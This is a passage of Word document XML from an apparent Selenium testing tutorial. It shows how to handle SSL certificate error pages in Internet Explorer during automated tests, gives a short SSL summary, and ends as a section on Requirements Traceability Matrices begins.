            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> In the following we will see how to handle SSL error in IE.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="679" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="680" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Observe SSL certificate error in IE browser you will find "Continue to this website (not recommended)" </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>link.This</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> link has ID "override </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>link".You</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> can view the ID in HTML mode using F12.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="681" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B03134">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B2602D1" wp14:editId="6C46E52A">
            <wp:extent cx="5951220" cy="4823460"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="55" name="Picture 55" descr="SSL Certificate Error Handling in Selenium">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SL Certificate Error Handling in Selenium">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1220" cy="4823460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="682" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="683" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Click on the link using </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>driver.navigate</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>) method with</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/interactive-javascript-tutorials.html" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> JavaScript </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>as below :-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="684" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="685" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>driver.navigate</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> ().to ("</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>javascript</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>:document.getElementById</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>('</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>overridelink</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>').click()");</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="117"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="686" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="687" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The second method is quite similar to chrome SSL Handling code</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="688" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="689" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>DesiredCapabilities</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> capabilities = new </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>DesiredCapabilities</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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="690" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="691" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>capabilities.setCapability</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>CapabilityType.ACCEPT_SSL_CERTS</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>, true);</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="692" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="693" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>System.setProperty</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"webdriver.ie.driver","IEDriverServer.exe");</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="694" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="695" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>WebDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t xml:space="preserve"> driver = new </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>InternetExplorerDriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
          </w:rPr>
          <w:t>capabilities);</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="696" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="697" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The above code will help to handle SSL certificate error in IE.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="698" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="699" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Summary:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="700" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="701" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL (Secure Sockets Layer) is a standard security protocol for establishing secure connection between the server and the client</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="702" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="703" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Browser and the server use SSL Certificate mechanism to be able to establish a secure connection.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="704" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="705" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>SSL works through a combination of programs and encryption/decryption routine that exist on the web server computer and web server browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="706" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="707" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>When secure connection is not established between the server and client due to certificate SSL certificate error will occur</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="118"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="708" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="709" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Need to adjust our script in such a way that it will take care of SSL Exception/error by itself through Selenium Web driver.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00B61F9E" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="7F7F7F" w:themeColor="text1" w:themeTint="80"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61F9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="7F7F7F" w:themeColor="text1" w:themeTint="80"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>How to Create Requirements Traceability Matrix (RTM)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="276" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="710" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="711" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>What is Traceability Matrix</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>?(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>TM)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00BB3F9F" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="712" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="713" w:author="Unknown">
        <w:r w:rsidRPr="00BB3F9F">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>A Traceability Matrix is a document that co-relates any two-baseline documents that require a many-to-many relationship to check the completeness of the relationship.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="714" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="715" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>It is used to track the requirements and to check the current project requirements are met.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="276" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="716" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="717" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>What is RTM (Requirement Traceability Matrix)?</w:t>
        </w:r>
      </w:ins>
    </w:p>
